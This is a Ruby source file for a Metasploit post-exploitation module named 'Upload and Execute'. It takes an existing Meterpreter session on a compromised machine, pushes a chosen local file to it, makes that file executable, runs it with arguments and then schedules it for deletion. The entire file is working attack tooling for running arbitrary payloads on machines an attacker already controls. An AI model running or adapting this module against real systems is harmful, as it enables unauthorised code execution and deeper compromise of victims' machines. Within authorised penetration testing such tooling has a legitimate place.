##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
                      'Name'         => 'Upload and Execute',
                      'Description'  => %q{Push a file and execute it.},
                      'Author'       => 'viper',
                      'License'      => MSF_LICENSE,
                      'Platform'     => ['win', 'unix', 'linux', 'osx', 'bsd', 'solaris'],
                      'SessionTypes' => ['meterpreter']
          ))

    register_options([
                             OptString.new('LPATH', [true, 'Local file path to upload and execute']),
                             OptString.new('RPATH', [false, 'Remote file path on target (default is basename of LPATH)']),
                             OptString.new('ARGS', [false, 'Command-line arguments to pass to the uploaded file']),
                             OptInt.new('TIMEOUT', [true, 'Timeout for command execution', 1800])
                     ])
  end

  def run

    if session.type == "shell"
      print_error("Unsupport shell type")
      return
    end
    if File.file?(File.join(Msf::Config.install_root, "scripts", "pe", datastore['LPATH']))
      script_path = File.join(Msf::Config.install_root, "scripts", "pe", datastore['LPATH'])
    elsif File.file?(datastore['LPATH'])
      script_path = datastore['LPATH']
    else
      result[:status]  = false
      result[:message] = "#{datastore['LPATH']} not found"
      if datastore['OUTFORMAT'] == 'json'
        json = Yajl::Encoder.encode(result)
        json = json.encode('UTF-8', :invalid => :replace, :replace => "?")
        print("#{json}")
      else
        print_error("pe not found")
      end
      return
    end

    tmprpath = rpath
    vprint_status("Uploading #{script_path} to #{tmprpath}")
    upload_file(tmprpath, script_path)


    if session.platform == 'windows'
      # Don't use cmd.exe /c start so we can fetch output
      cmd = tmprpath
    else
      # Set 700 so only we can execute the file
      chmod(tmprpath, 0700)

      # Handle absolute paths
      cmd = tmprpath.start_with?('/') ? tmprpath : "./#{tmprpath}"
    end

    vprint_status("Executing command: #{cmd}")
    output = cmd_exec(cmd, args, datastore['TIMEOUT'])

    if output.blank?
      print_status('Command returned no output')
    else
      print_line(output)
    end
    register_file_for_cleanup(tmprpath)
  end

  def lpath
    datastore['LPATH']
  end

  def rpath
    Time.now.to_i
    if session.platform == "windows"
      filename = '\\' + Time.now.to_i.to_s + ".exe"
      datastore['RPATH'].blank? ? get_env('TEMP') + filename : datastore['RPATH']
    else
      filename = '/' + Time.now.to_i.to_s
      datastore['RPATH'].blank? ? session.fs.dir.pwd + filename : datastore['RPATH']
    end
  end

  def args
    datastore['ARGS']
  end

  def timeout
    datastore['TIMEOUT']
  end
end
